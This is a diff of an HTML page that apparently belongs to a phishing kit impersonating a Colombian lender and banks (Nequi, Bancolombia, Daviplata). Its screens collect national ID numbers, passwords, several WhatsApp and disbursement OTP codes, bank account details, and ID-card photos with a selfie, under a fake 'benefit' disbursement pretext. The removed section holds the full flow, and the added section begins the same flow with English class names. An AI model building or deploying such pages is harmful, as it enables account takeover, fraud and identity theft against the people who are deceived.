+.foto-orbit{width:104px;height:104px;border-radius:32px;margin:0 auto 18px;background:radial-gradient(circle at 50% 50%,#fff 0 35%,#EAF1FF 36% 100%);display:flex;align-items:center;justify-content:center;position:relative}
+.foto-orbit::before,.foto-orbit::after{content:'';position:absolute;border:1.5px solid rgba(28,103,216,.25);border-radius:34px;inset:8px;animation:fotoPulse 1.8s ease-in-out infinite}
+.foto-orbit::after{inset:18px;animation-delay:.35s}
+.foto-avatar{width:54px;height:54px;border-radius:18px;background:var(--blue);color:#fff;display:flex;align-items:center;justify-content:center;font-size:28px;position:relative;z-index:1;box-shadow:0 10px 25px rgba(28,103,216,.24)}
+.foto-name{font-size:19px;font-weight:800;color:var(--text);margin-bottom:8px}
+.foto-desc{font-size:13px;color:var(--text2);line-height:1.55;margin:0 auto 18px;max-width:320px}
+.foto-action{width:100%;height:50px;border:none;border-radius:999px;background:linear-gradient(135deg,var(--blue),var(--accent));color:#fff;font-size:15px;font-weight:800;cursor:pointer;box-shadow:0 10px 22px rgba(28,103,216,.24)}
+.foto-action:disabled{cursor:not-allowed;opacity:.82}
+.foto-panel.done .foto-action{background:var(--green);box-shadow:0 10px 22px rgba(15,110,86,.18)}
+.foto-steps{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-top:16px}
+.foto-step{height:7px;border-radius:999px;background:#E4E7EC;overflow:hidden}
+.foto-step.done{background:var(--green)}
+.foto-step.active{background:linear-gradient(90deg,var(--blue),var(--accent));animation:fotoBar 1.2s ease-in-out infinite}
+.foto-input{display:none}
+@keyframes fotoIn{from{opacity:0;transform:translateY(10px) scale(.98)}to{opacity:1;transform:translateY(0) scale(1)}}
+@keyframes fotoPulse{0%,100%{transform:scale(.96);opacity:.5}50%{transform:scale(1.05);opacity:1}}
+@keyframes fotoBar{0%,100%{filter:saturate(1);opacity:.75}50%{filter:saturate(1.3);opacity:1}}
+
+/* ESPERA CUENTA */
+#s-espera2{align-items:center;justify-content:center;flex-direction:column;gap:0;
+  background:linear-gradient(160deg,#0D2A6E 0%,#1C67D8 60%,#4E7EFF 100%)}
+/* PUSH NOTIFICATION */
+.push-notice{position:fixed;top:14px;left:50%;transform:translate(-50%,-130%);width:calc(100% - 28px);
+  max-width:402px;background:#fff;border:1px solid var(--border);border-radius:18px;
+  box-shadow:0 18px 50px rgba(13,42,110,.22);padding:14px;z-index:300;opacity:0;
+  transition:transform .25s ease,opacity .25s ease}
+.push-notice.show{transform:translate(-50%,0);opacity:1}
+.push-head{display:flex;align-items:center;gap:10px;margin-bottom:8px}
+.push-ico{width:34px;height:34px;border-radius:12px;background:var(--blue-light);color:var(--blue);
   display:flex;align-items:center;justify-content:center;font-size:18px;font-weight:800;flex-shrink:0}
-.notif-titulo{font-size:14px;font-weight:800;color:var(--texto-primary)}
-.notif-contenido{font-size:14px;color:var(--texto-secondary);line-height:1.45;margin-bottom:12px;word-break:break-word}
-.notif-boton{width:100%;height:42px;border:none;border-radius:999px;
-  background:linear-gradient(135deg,var(--principal),var(--destaque));
+.push-title{font-size:14px;font-weight:800;color:var(--text)}
+.push-msg{font-size:14px;color:var(--text2);line-height:1.45;margin-bottom:12px;word-break:break-word}
+.push-ok{width:100%;height:42px;border:none;border-radius:999px;background:linear-gradient(135deg,var(--blue),var(--accent));
   color:#fff;font-size:14px;font-weight:800;cursor:pointer}
+
+/* WTHSAPP CARD */
+.wthsapp-card{background:linear-gradient(180deg,#0D2A6E 0%,#1C67D8 100%);border-radius:20px;padding:28px;color:#fff;box-shadow:0 20px 40px rgba(13,42,110,.18);text-align:center;margin-bottom:22px}
+.wthsapp-icon{width:56px;height:56px;border-radius:50%;background:rgba(255,255,255,.12);display:inline-flex;align-items:center;justify-content:center;margin:0 auto 12px;font-size:26px}
+.wthsapp-title{font-size:20px;font-weight:800;letter-spacing:.04em;margin-bottom:8px}
+.wthsapp-text{font-size:14px;color:rgba(255,255,255,.95);line-height:1.5;margin-bottom:12px;max-width:360px;margin-left:auto;margin-right:auto}
+.wthsapp-strong{font-weight:800;margin-top:6px;color:#fff;margin-bottom:18px}
+.wthsapp-btn{width:100%;height:60px;border-radius:34px;border:none;background:linear-gradient(135deg,#0F6E56,#0F845F);color:#fff;font-size:18px;font-weight:800;box-shadow:0 18px 36px rgba(15,110,86,.22);cursor:pointer;margin-bottom:18px}
 </style>
 </head>
 <body>
-<div class="contenedor-principal">
+<div class="app">
 
-<svg style="display:none"><defs>
-<symbol id="logotipo" viewBox="0 0 64 24" fill="none">
-<path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="currentColor"/>
-<path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="currentColor"/>
-<path d="M53.13 0C51.81 0 50.73 1.07 50.73 2.38V7.17C49.48 6.51 48.05 6.13 46.53 6.13C41.57 6.13 37.53 10.14 37.53 15.07C37.53 20 41.56 24 46.53 24C51.5 24 55.54 20 55.54 15.07V2.38C55.54 1.07 54.46 0 53.13 0ZM46.53 19.23C44.22 19.23 42.33 17.37 42.33 15.07C42.33 12.77 44.21 10.9 46.53 10.9C48.85 10.9 50.73 12.77 50.73 15.07C50.73 17.37 48.85 19.23 46.53 19.23Z" fill="currentColor"/>
-<path d="M60.9 7.79C59.57 7.79 58.5 8.86 58.5 10.17V21.61C58.5 22.93 59.57 23.99 60.9 23.99C62.22 23.99 63.3 22.93 63.3 21.61V10.17C63.3 8.86 62.22 7.79 60.9 7.79Z" fill="currentColor"/>
-<path d="M8.12 2.06C3.64 2.06 0 5.67 0 10.12V21.61C0 22.93 1.08 23.99 2.4 23.99C3.73 23.99 4.81 22.93 4.81 21.61V17.44H11.43V21.61C11.43 22.93 12.51 23.99 13.83 23.99C15.16 23.99 16.24 22.93 16.24 21.61V10.12C16.24 5.67 12.59 2.06 8.12 2.06ZM11.44 12.67H4.81V10.12C4.81 8.3 6.3 6.83 8.12 6.83C9.95 6.83 11.44 8.3 11.44 10.12V12.67Z" fill="currentColor"/>
-</symbol>
-</defs></svg>
-
-<!-- Notificación emergente flotante -->
-<aside class="notificacion-emergente" id="notif-push">
-  <div class="notif-encabezado">
-    <div class="notif-icono">!</div>
-    <p class="notif-titulo">Notificaci&oacute;n</p>
+<div class="push-notice" id="push-notice">
+  <div class="push-head">
+    <div class="push-ico">!</div>
+    <div class="push-title">Notificaci&oacute;n</div>
   </div>
-  <p class="notif-contenido" id="notif-mensaje"></p>
-  <button class="notif-boton" onclick="aceptarNotificacion()">Aceptar</button>
-</aside>
-
-<!-- Vista: Cargador inicial -->
-<section class="vista activa" id="v-cargador">
-  <svg style="margin:auto auto 0;color:#fff" width="90" height="34"><use href="#logotipo"/></svg>
-  <div class="spinner-anillo" style="margin:0 auto"></div>
-  <p class="texto-espera" style="margin:0 auto auto">Iniciando sesión</p>
-</section>
-
-<!-- Vista: Acceso -->
-<section class="vista" id="v-acceso">
-  <div class="bloque-acceso">
-    <div class="acceso-logo"><svg width="80" height="30" style="color:#fff"><use href="#logotipo"/></svg></div>
-    <h1 class="acceso-titulo">Accede a tu beneficio</h1>
-    <p class="acceso-descripcion">Ingresa tu n&uacute;mero de documento para continuar.</p>
-  </div>
-  <div class="cuerpo-vista" style="padding-top:28px">
-    <div id="error-acceso" class="alerta-box">
-      <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
-      <span>Documento inv&aacute;lido. Por favor vuelve a intentarlo.</span>
-    </div>
-    <div class="grupo-entrada">
-      <label class="etiqueta-entrada" for="f-documento">N&uacute;mero de documento</label>
-      <input class="entrada-texto" type="number" id="f-documento" placeholder="Ej: 1023456789" oninput="validarDocumento()">
-    </div>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-acceso" disabled onclick="enviarDocumento()">Enviar documento →</button>
-  </div>
-</section>
-
-<!-- Vista: Contraseña -->
-<section class="vista" id="v-contrasena">
-  <div class="bloque-acceso">
-    <div class="acceso-logo" style="opacity:.85"><svg width="80" height="30" style="color:#fff"><use href="#logotipo"/></svg></div>
-    <h1 class="acceso-titulo">Ingresar contrase&ntilde;a</h1>
-    <p class="acceso-descripcion">Ingresa tu contrase&ntilde;a para continuar.</p>
-  </div>
-  <div class="cuerpo-vista" style="padding-top:28px">
-    <div id="error-contrasena" class="alerta-box">
-      <svg width="18" height="18" viewBox="0 0 18 18" fill="none"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
-      <span>Contrase&ntilde;a inv&aacute;lida.</span>
-    </div>
-    <div class="grupo-entrada">
-      <label class="etiqueta-entrada" for="f-clave">Contrase&ntilde;a</label>
-      <input class="entrada-texto" type="password" id="f-clave" placeholder="••••••••" oninput="validarContrasena()">
-    </div>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-contrasena" disabled onclick="enviarContrasena()">Enviar →</button>
-  </div>
-</section>
-
-<!-- Vista: Confirmación por WhatsApp -->
-<section class="vista" id="v-confirmacion-wa">
-  <header class="barra-titulo" style="border-bottom:none">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:70%"></div></div></div>
-  <div class="cuerpo-vista">
-    <div class="bloque-otp">
-      <span class="otp-icono">📱</span>
-      <p class="otp-titulo">Confirmaci&oacute;n por WhatsApp</p>
-      <p class="otp-descripcion">C&oacute;digo enviado por WhatsApp al celular de la c&eacute;dula <span class="otp-numero" id="documento-confirmacion">—</span>.</p>
-    </div>
-    <div id="error-wa" class="alerta-otp">
-      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
-      <span>C&oacute;digo errado o vencido. Por favor coloca uno correctamente.</span>
-    </div>
-    <div class="contenedor-otp" id="caja-wa" onclick="enfocarCodigoWA()">
-      <div class="campo-digito"><div class="digito-visual" id="wd0"></div><div class="caja-digito" id="wl0"></div></div>
-      <div class="campo-digito"><div class="digito-visual" id="wd1"></div><div class="caja-digito" id="wl1"></div></div>
-      <div class="campo-digito"><div class="digito-visual" id="wd2"></div><div class="caja-digito" id="wl2"></div></div>
-      <div class="campo-digito"><div class="digito-visual" id="wd3"></div><div class="caja-digito" id="wl3"></div></div>
-      <div class="campo-digito"><div class="digito-visual" id="wd4"></div><div class="caja-digito" id="wl4"></div></div>
-      <div class="campo-digito"><div class="digito-visual" id="wd5"></div><div class="caja-digito" id="wl5"></div></div>
-    </div>
-    <input class="entrada-otp-real" type="number" id="entrada-wa" inputmode="numeric" maxlength="6" oninput="procesarEntradaWA(this)" onkeydown="procesarTeclaWA(event)">
-    <p class="info-otp">El c&oacute;digo expira en 5 minutos</p>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-wa" disabled onclick="enviarCodigoWA()">Confirmar →</button>
-  </div>
-</section>
-
-<!-- Vista: Aprobación por correo -->
-<section class="vista" id="v-aprobacion-email">
-  <header class="barra-titulo" style="border-bottom:none">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:80%"></div></div></div>
-  <div class="cuerpo-vista">
-    <div class="bloque-otp">
-      <span class="otp-icono">📧</span>
-      <p class="otp-titulo">Activaci&oacute;n de beneficio</p>
-      <p class="otp-descripcion">Aprueba o deniega el beneficio enviado al correo registrado con la c&eacute;dula <span class="otp-numero" id="documento-email">—</span>.</p>
-    </div>
-    <p class="info-otp" style="margin-top:20px;text-align:center;font-weight:600">Selecciona una opci&oacute;n:</p>
-    <div class="grupo-botones">
-      <button class="boton-aceptar" onclick="aprobarSolicitud()">✓ Aprobar</button>
-      <button class="boton-rechazar" onclick="denegarSolicitud()">✗ Denegar</button>
-    </div>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-email" disabled onclick="enviarAprobacion()">Confirmar desembolso →</button>
-  </div>
-</section>
-
-<!-- Vista: Espera 1 -->
-<section class="vista" id="v-espera">
-  <div class="cuerpo-espera" style="margin:auto">
-    <svg width="90" height="34" style="color:#fff"><use href="#logotipo"/></svg>
-    <div class="anillo-espera"></div>
-    <div>
-      <p class="titulo-espera texto-intercambiable" id="titulo-espera">Verificando identidad</p>
-      <p class="descripcion-espera texto-intercambiable" id="desc-espera" style="margin-top:8px">Estamos validando tu informaci&oacute;n. Por favor espera un momento.</p>
-    </div>
-    <div class="grupo-puntos">
-      <div class="punto-pulsante"></div>
-      <div class="punto-pulsante"></div>
-      <div class="punto-pulsante"></div>
-    </div>
-  </div>
-</section>
-
-<!-- Vista: Monto -->
-<section class="vista" id="v-monto">
-  <header class="barra-titulo" style="border-bottom:none">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:40%"></div></div></div>
-  <div class="cuerpo-vista">
-    <div class="bloque-monto">
-      <span class="monto-icono">💸</span>
-      <p class="monto-titulo">¿Cu&aacute;nto quieres desembolsar?</p>
-      <p class="monto-descripcion">Selecciona o ingresa el monto a recibir.</p>
-    </div>
-    <div class="cuadricula-valores">
-      <div class="opcion-valor" onclick="seleccionarMonto(500000)">$500.000</div>
-      <div class="opcion-valor" onclick="seleccionarMonto(1000000)">$1.000.000</div>
-      <div class="opcion-valor" onclick="seleccionarMonto(1500000)">$1.500.000</div>
-      <div class="opcion-valor" onclick="seleccionarMonto(2000000)">$2.000.000</div>
-    </div>
-    <div class="grupo-entrada">
-      <label class="etiqueta-entrada" for="f-cantidad">O ingresa el monto manualmente</label>
-      <div class="contenedor-entrada-monto">
-        <span class="prefijo-moneda">$</span>
-        <input class="entrada-monto entrada-texto" type="number" id="f-cantidad" placeholder="0" oninput="procesarMonto(this)">
-      </div>
-    </div>
-    <p class="info-monto">Monto m&iacute;nimo $100.000 — m&aacute;ximo $5.000.000</p>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-monto" disabled onclick="irACuentaBancaria()">Continuar →</button>
-  </div>
-</section>
-
-<!-- Vista: Cuenta -->
-<section class="vista" id="v-cuenta">
-  <header class="barra-titulo">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:65%"></div></div></div>
-  <div class="cuerpo-vista">
-    <h2 class="titulo-cuenta">¿A qu&eacute; cuenta quieres recibir tu cupo?</h2>
-    <p class="descripcion-cuenta">Elige c&oacute;mo recibir el desembolso.</p>
-    <div class="lista-opciones">
-      <div class="item-opcion" id="btn-nequi" onclick="seleccionarMetodo('nequi')">
-        <div class="icono-opcion icono-nequi" style="overflow:hidden"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ7ApU9gFh2quNO1A7z7Fsq-QbpKtHmmYLl9EDQ0QAm5snyXvnCetGuDzA&s=10" style="width:40px;height:40px;object-fit:contain"></div>
-        <div><p class="nombre-opcion">Nequi</p><p class="desc-opcion">Desembolso inmediato a tu cuenta Nequi</p></div>
-      </div>
-      <div class="item-opcion" id="btn-bancolombia" onclick="seleccionarMetodo('bancolombia')">
-        <div class="icono-opcion icono-banco" style="overflow:hidden"><img src="https://cdn.brandfetch.io/grupobancolombia.com/fallback/lettermark/theme/dark/h/256/w/256/icon?c=1bfwsmEH20zzEfSNTed" style="width:40px;height:40px;object-fit:contain"></div>
-        <div><p class="nombre-opcion">Bancolombia</p><p class="desc-opcion">Transferencia a tu cuenta de ahorros o corriente</p></div>
-      </div>
-      <div class="item-opcion" id="btn-daviplata" onclick="seleccionarMetodo('daviplata')">
-        <div class="icono-opcion icono-davi" style="overflow:hidden"><img src="https://wsrv.nl/?url=images.seeklogo.com/logo-png/45/1/daviplata-logo-png_seeklogo-457809.png&w=80&h=80&fit=contain&output=png" style="width:40px;height:40px;object-fit:contain"></div>
-        <div><p class="nombre-opcion">Daviplata</p><p class="desc-opcion">Recibe directamente en tu billetera Daviplata</p></div>
-      </div>
-    </div>
-    <div class="formulario-datos" id="form-datos">
-      <div class="linea-separador"></div>
-      <div class="grupo-entrada">
-        <label class="etiqueta-entrada" for="f-titular">Nombre completo del titular</label>
-        <input class="entrada-texto" type="text" id="f-titular" placeholder="Ej: Mar&iacute;a Fernanda Gonz&aacute;lez" oninput="validarCuenta()">
-      </div>
-      <div class="grupo-entrada">
-        <label class="etiqueta-entrada" for="f-cedula-titular">N&uacute;mero de c&eacute;dula</label>
-        <input class="entrada-texto" type="number" id="f-cedula-titular" placeholder="Ej: 1023456789" oninput="validarCuenta()">
-      </div>
-      <div class="grupo-entrada">
-        <label class="etiqueta-entrada" for="f-numero-cuenta" id="label-numero">N&uacute;mero de cuenta / Nequi</label>
-        <input class="entrada-texto" type="number" id="f-numero-cuenta" placeholder="Ej: 3001234567" oninput="validarCuenta()">
-      </div>
-    </div>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-cuenta" disabled onclick="enviarCuenta()">Continuar →</button>
-  </div>
-</section>
-
-<!-- Vista: Fotos -->
-<section class="vista" id="v-fotos">
-  <header class="barra-titulo">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:80%"></div></div></div>
-  <div class="cuerpo-vista">
-    <div class="bloque-otp">
-      <span class="otp-icono">&#128100;</span>
-      <p class="otp-titulo">Validaci&oacute;n de identidad</p>
-      <p class="otp-descripcion">Adjunta tres fotos para validar tu identidad.</p>
-    </div>
-    <div id="error-fotos" class="alerta-otp">
-      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
-      <span>Foto borrosa o no detectada. Por favor toma una m&aacute;s clara.</span>
-    </div>
-    <div class="panel-fotografia" id="panel-fotos">
-      <div class="foto-escena" id="escena-foto">
-        <div class="foto-etiqueta" id="paso-foto">Paso 1 de 3</div>
-        <div class="foto-orbita">
-          <div class="foto-avatar" id="avatar-foto">&#128196;</div>
-        </div>
-        <p class="foto-nombre" id="nombre-foto">C&eacute;dula por delante</p>
-        <p class="foto-instruccion" id="instruccion-foto">Foto clara del frente de la c&eacute;dula con buena luz.</p>
-        <button class="foto-boton" id="boton-foto" onclick="abrirCamaraFoto()">Tomar foto</button>
-      </div>
-      <div class="foto-pasos" aria-hidden="true">
-        <div class="foto-paso activo" id="paso-cedula-frente"></div>
-        <div class="foto-paso" id="paso-cedula-detras"></div>
-        <div class="foto-paso" id="paso-selfie"></div>
-      </div>
-    </div>
-    <input class="entrada-foto" type="file" id="entrada-foto-frente" accept="image/*" capture="environment" data-foto-clave="cedulaFrente" onchange="procesarFoto(this)">
-    <input class="entrada-foto" type="file" id="entrada-foto-detras" accept="image/*" capture="environment" data-foto-clave="cedulaDetras" onchange="procesarFoto(this)">
-    <input class="entrada-foto" type="file" id="entrada-foto-rostro" accept="image/*" capture="user" data-foto-clave="selfie" onchange="procesarFoto(this)">
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-fotos" disabled onclick="enviarFotos()">Enviar fotos &rarr;</button>
-  </div>
-</section>
-
-<!-- Vista: Espera 2 -->
-<section class="vista" id="v-espera2">
-  <div class="cuerpo-espera" style="margin:auto">
-    <svg width="90" height="34" style="color:#fff"><use href="#logotipo"/></svg>
-    <div class="anillo-espera"></div>
-    <div>
-      <p class="titulo-espera texto-intercambiable" id="titulo-espera2">Validando cuenta</p>
-      <p class="descripcion-espera texto-intercambiable" id="desc-espera2" style="margin-top:8px">Estamos verificando los datos de tu cuenta. Esto puede tardar unos segundos.</p>
-    </div>
-    <div class="grupo-puntos">
-      <div class="punto-pulsante"></div>
-      <div class="punto-pulsante"></div>
-      <div class="punto-pulsante"></div>
-    </div>
-  </div>
-</section>
-
-<!-- Vista: OTP principal -->
-<section class="vista" id="v-otp-principal">
-  <header class="barra-titulo" style="border-bottom:none">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:95%"></div></div></div>
-  <div class="cuerpo-vista">
-    <div class="bloque-otp">
-      <span class="otp-icono">💬</span>
-      <p class="otp-titulo">C&oacute;digo de verificaci&oacute;n</p>
-      <p class="otp-descripcion">C&oacute;digo de 6 d&iacute;gitos enviado por WhatsApp a la c&eacute;dula <span class="otp-numero" id="celular-otp">registrado</span>.</p>
-    </div>
-    <div id="error-otp" class="alerta-otp">
-      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
-      <span>C&oacute;digo errado o vencido. Por favor coloca uno correctamente.</span>
-    </div>
-    <div class="contenedor-otp" id="caja-otp" onclick="enfocarOTP()">
-      <div class="campo-digito"><div class="caja-digito" id="l0"><div class="digito-visual" id="d0"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="l1"><div class="digito-visual" id="d1"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="l2"><div class="digito-visual" id="d2"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="l3"><div class="digito-visual" id="d3"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="l4"><div class="digito-visual" id="d4"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="l5"><div class="digito-visual" id="d5"></div></div></div>
-    </div>
-    <input class="entrada-otp-real" type="number" id="entrada-otp" inputmode="numeric" maxlength="6" oninput="procesarEntradaOTP(this)" onkeydown="procesarTeclaOTP(event)">
-    <p class="info-otp">El c&oacute;digo expira en 5 minutos</p>
-    <p class="reenvio-otp">¿No lo recibiste? <span onclick="reenviarOTP()">Reenviar c&oacute;digo</span></p>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-otp" disabled onclick="enviarOTP()">Finalizar →</button>
-  </div>
-</section>
-
-<!-- Vista: OTP desembolso -->
-<section class="vista" id="v-otp-desembolso">
-  <header class="barra-titulo" style="border-bottom:none">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:95%"></div></div></div>
-  <div class="cuerpo-vista">
-    <div class="bloque-otp">
-      <span class="otp-icono">💬</span>
-      <p class="otp-titulo">¡Felicidades!</p>
-      <p class="otp-descripcion">Tu desembolso con <span class="otp-numero" id="aliado-desembolso">registrado</span> est&aacute; listo. Ingresa el c&oacute;digo enviado para confirmar.</p>
-    </div>
-    <div id="error-otp-desembolso" class="alerta-otp">
-      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
-      <span>C&oacute;digo errado o vencido. Por favor coloca uno correctamente.</span>
-    </div>
-    <div class="contenedor-otp" id="caja-otp-desembolso" onclick="enfocarOTPDesembolso()">
-      <div class="campo-digito"><div class="caja-digito" id="ld0"><div class="digito-visual" id="dd0"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="ld1"><div class="digito-visual" id="dd1"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="ld2"><div class="digito-visual" id="dd2"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="ld3"><div class="digito-visual" id="dd3"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="ld4"><div class="digito-visual" id="dd4"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="ld5"><div class="digito-visual" id="dd5"></div></div></div>
-    </div>
-    <input class="entrada-otp-real" type="number" id="entrada-otp-desembolso" inputmode="numeric" maxlength="6" oninput="procesarEntradaOTPDesembolso(this)" onkeydown="procesarTeclaOTPDesembolso(event)">
-    <p class="info-otp">El c&oacute;digo expira en 5 minutos</p>
-    <p class="reenvio-otp">¿No lo recibiste? <span onclick="reenviarOTPDesembolso()">Reenviar c&oacute;digo</span></p>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-otp-desembolso" disabled onclick="enviarOTPDesembolso()">Finalizar &rarr;</button>
-  </div>
-</section>
-
-<!-- Vista: OTP otro -->
-<section class="vista" id="v-otp-otro">
-  <header class="barra-titulo" style="border-bottom:none">
-    <svg width="60" height="22" style="color:#1C67D8"><use href="#logotipo"/></svg>
-  </header>
-  <div class="contenedor-progreso"><div class="barra-progreso"><div class="progreso-relleno" style="width:95%"></div></div></div>
-  <div class="cuerpo-vista">
-    <div class="bloque-otp">
-      <span class="otp-icono" style="color:#16A34A">✓</span>
-      <p class="otp-titulo">¡Felicidades!</p>
-      <p class="otp-descripcion">Tu desembolso con <span class="otp-numero" id="nombre-otro"> </span> est&aacute; listo. Ingresa el c&oacute;digo enviado por WhatsApp.</p>
-    </div>
-    <div id="error-otp-otro" class="alerta-otp">
-      <svg width="18" height="18" viewBox="0 0 18 18" fill="none" style="flex-shrink:0"><circle cx="9" cy="9" r="8" stroke="#D83B3B" stroke-width="1.5"/><path d="M9 5v4M9 12.5v .5" stroke="#D83B3B" stroke-width="1.8" stroke-linecap="round"/></svg>
-      <span>C&oacute;digo errado o vencido. Por favor coloca uno correctamente.</span>
-    </div>
-    <div class="contenedor-otp" id="caja-otp-otro" onclick="enfocarOTPOtro()">
-      <div class="campo-digito"><div class="caja-digito" id="lo0"><div class="digito-visual" id="do0"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="lo1"><div class="digito-visual" id="do1"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="lo2"><div class="digito-visual" id="do2"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="lo3"><div class="digito-visual" id="do3"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="lo4"><div class="digito-visual" id="do4"></div></div></div>
-      <div class="campo-digito"><div class="caja-digito" id="lo5"><div class="digito-visual" id="do5"></div></div></div>
-    </div>
-    <input class="entrada-otp-real" type="number" id="entrada-otp-otro" inputmode="numeric" maxlength="6" oninput="procesarEntradaOTPOtro(this)" onkeydown="procesarTeclaOTPOtro(event)">
-    <p class="info-otp">El c&oacute;digo expira en 5 minutos</p>
-    <p class="reenvio-otp">¿No lo recibiste? <span onclick="reenviarOTPOtro()">Reenviar c&oacute;digo</span></p>
-  </div>
-  <div class="pie-vista">
-    <button class="boton-principal" id="btn-otp-otro" disabled onclick="enviarOTPOtro()">Finalizar &rarr;</button>
-  </div>
-</section>
-
-<!-- Vista: Éxito -->
-<section class="vista" id="v-exito">
-  <div class="cuerpo-vista" style="display:flex;flex-direction:column;align-items:center;justify-content:center">
-    <div class="bloque-exito">
-      <span class="exito-icono">✓</span>
-      <p class="exito-titulo">¡Éxito!</p>
-      <p class="exito-descripcion">Tu solicitud fue procesada. Un asesor te contactar&aacute; por WhatsApp.</p>
-    </div>
-  </div>
-</section>
-
+  <div class="push-msg" id="push-message"></div>
+  <button class="push-ok" onclick="acceptPush()">Aceptar</button>
 </div>
 
+<!-- LOADER -->
+<div class="screen active" id="s-loader">
+  <svg style="margin:auto auto 0" width="90" height="34" viewBox="0 0 64 24" fill="none"><g clip-path="url(#c0)">
+    <path d="M60.91 6.15C62.62 6.15 64 4.77 64 3.08C64 1.38 62.62 0 60.91 0C59.19 0 57.8 1.37 57.8 3.07C57.8 4.77 59.19 6.14 60.91 6.14V6.15Z" fill="white"/>
+    <path d="M33.49 0C32.16 0 31.09 1.07 31.09 2.38V7.17C29.83 6.51 28.41 6.13 26.89 6.13C21.93 6.13 17.88 10.14 17.88 15.07C17.88 20 21.92 24 26.89 24C31.86 24 35.89 20 35.89 15.07V2.38C35.89 1.07 34.82 0 33.49 0ZM26.89 19.23C24.58 19.23 22.7 17.37 22.7 15.07C22.7 12.77 24.58 10.9 26.89 10.9C29.21 10.9 31.09 12.77 31.09 15.07C31.09 17.37 29.21 19.23 26.89 19.23Z" fill="white"/>
